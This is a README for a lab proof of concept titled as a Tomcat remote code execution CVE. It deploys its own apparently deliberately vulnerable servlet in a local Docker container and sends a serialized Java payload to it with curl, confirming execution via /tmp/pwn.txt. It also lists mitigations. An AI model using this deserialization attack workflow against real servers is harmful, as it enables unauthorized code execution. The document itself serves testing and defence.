# CVE-2025-24813 PoC (Apache Tomcat RCE)

Demonstrates Remote Code Execution (RCE) via unsafe Java deserialization in Tomcat 10.0.0.

---

## Requirements

* Docker
* Tomcat 10.0.0 Docker image
* Java JDK
* Curl or Python for sending requests

---

## Setup

```bash
# Install Docker and Java
sudo apt update
sudo apt install -y docker.io default-jdk

# Start Docker
sudo systemctl start docker
sudo systemctl enable docker

# Pull Tomcat image
docker pull tomcat:10.0.0
```

**Build the PoC application:**

```bash
cd ~/vuln-app-src

mkdir -p ~/vuln-app/WEB-INF/classes
javac -cp jakarta-servlet.jar -d ~/vuln-app/WEB-INF/classes ExploitServlet.java
javac -d ~/vuln-app/WEB-INF/classes SafeGadget.java

cp index.jsp ~/vuln-app
cp WEB-INF/web.xml ~/vuln-app/WEB-INF

cd ~/vuln-app
jar -cvf vuln-app.war *
```

**Deploy to Tomcat:**

```bash
docker run -d --name tomcat -p 8080:8080 tomcat:10.0.0
docker cp ~/vuln-app/vuln-app.war tomcat:/usr/local/tomcat/webapps/
docker restart tomcat

docker exec -it tomcat ls -R /usr/local/tomcat/webapps/vuln-app
```

---

## Execute PoC

```bash
# Create payload
cd ~/vuln-app-src
javac SafeGadgetSerializer.java
java SafeGadgetSerializer
ls -l payload.ser

# Send payload to Tomcat
curl -v -X POST http://localhost:8080/vuln-app/vulnerable_endpoint \
-H "Content-Type: application/x-java-serialized-object" \
--data-binary @payload.ser

# Verify execution
docker exec -it tomcat cat /tmp/pwn.txt
```

> `/tmp/pwn.txt` confirms RCE was successful.

---

## Mitigation

* Disable endpoints accepting serialized objects
* Patch Tomcat and libraries
* Apply JVM serialization filters or whitelist classes
* Remove unnecessary gadget libraries
* Run Tomcat with minimal privileges

---

## Disclaimer

* **For educational/testing purposes only**
* Test only on authorized environments
* Do not exploit production servers
